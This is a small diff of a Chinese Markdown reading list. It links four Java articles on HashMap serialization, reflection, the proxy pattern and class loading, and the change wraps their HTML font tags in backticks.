-<font style="color:rgb(37, 41, 51);">为什么HashMap要自己实现writeObject和readObject方法？</font>
+`<font style="color:rgb(37, 41, 51);">`为什么HashMap要自己实现writeObject和readObject方法？`</font>`
 
 [https://juejin.cn/post/6844903954774491144](https://juejin.cn/post/6844903954774491144)
 
-<font style="color:rgb(37, 41, 51);">谈谈Java反射：从入门到实践，再到原理</font>
+`<font style="color:rgb(37, 41, 51);">`谈谈Java反射：从入门到实践，再到原理`</font>`
 
 [https://juejin.cn/post/6844904025607897096](https://juejin.cn/post/6844904025607897096)
 
-<font style="color:rgb(25, 27, 31);">设计模式（四）——搞懂什么是代理模式</font>
+`<font style="color:rgb(25, 27, 31);">`设计模式（四）——搞懂什么是代理模式`</font>`
 
 [https://zhuanlan.zhihu.com/p/72644638](https://zhuanlan.zhihu.com/p/72644638)
 
-<font style="color:rgb(33, 37, 41);">Java类加载机制和对象创建过程</font>
+`<font style="color:rgb(33, 37, 41);">`Java类加载机制和对象创建过程`</font>`
 
 [https://segmentfault.com/a/1190000023876273](https://segmentfault.com/a/1190000023876273)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
